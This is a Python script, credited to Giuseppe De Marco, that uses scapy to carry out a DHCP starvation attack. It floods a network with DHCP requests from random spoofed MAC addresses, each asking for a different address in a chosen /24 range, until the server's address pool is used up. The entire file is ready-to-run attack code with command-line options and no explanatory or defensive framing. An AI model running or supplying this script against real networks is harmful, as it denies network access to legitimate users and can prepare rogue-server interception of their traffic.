#!/usr/bin/env python3
# Giuseppe De Marco

from scapy.all import *

def starvit(ip_subnet="192.168.27.",
            start_ip=100,
            end_ip=254,
            server_id="192.168.27.254",
            layer2_broadcast = "ff:ff:ff:ff:ff:ff"):
    # Stops scapy from checking return packet originating from any packet that we have sent out
    conf.checkIPaddr = False
    
    def dhcp_starvation():
        for ip in range(start_ip, end_ip):
            bogus_mac_address = RandMAC()
            if server_id:
                dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)\
                               /IP(src="0.0.0.0", dst="255.255.255.255")\
                               /UDP(sport=68, dport=67)\
                               /BOOTP(chaddr=bogus_mac_address)\
                               /DHCP(options=[("message-type","request"),
                                              ("server_id",server_id),
                                              ("requested_addr", ip_subnet + str(ip)),
                                              "end"])
            else:
                dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)\
                               /IP(src="0.0.0.0", dst="255.255.255.255")\
                               /UDP(sport=68, dport=67)\
                               /BOOTP(chaddr=bogus_mac_address)\
                               /DHCP(options=[("message-type","request"),
                                              #("server_id",server_id),
                                              ("requested_addr", ip_subnet + str(ip)),
                                              "end"])
            sendp(dhcp_request)
            print("Requesting: " + ip_subnet + str(ip) + "\n")
            time.sleep(0.2)
    
    dhcp_starvation()
            
if __name__=="__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-subnet', required=True, 
                        help="/24 subnet, example: -subnet 192.168.27.")
    
    parser.add_argument('-start',
                        metavar='N',
                        type=int, 
                        help="start ip to request")

    parser.add_argument('-end',
                        metavar='N',
                        type=int, 
                        help="end ip to request")

    parser.add_argument('-server_id', required=False, 
                        help="DHCP server id, example: 192.168.27.254")

    # parser.add_argument('-stdout', nargs=1, help="print output, \
    # json or radcheck tuple", required=False)

    args = parser.parse_args()
    
    # run!
    starvit(args.subnet,
            args.start,
            args.end,
            args.server_id)
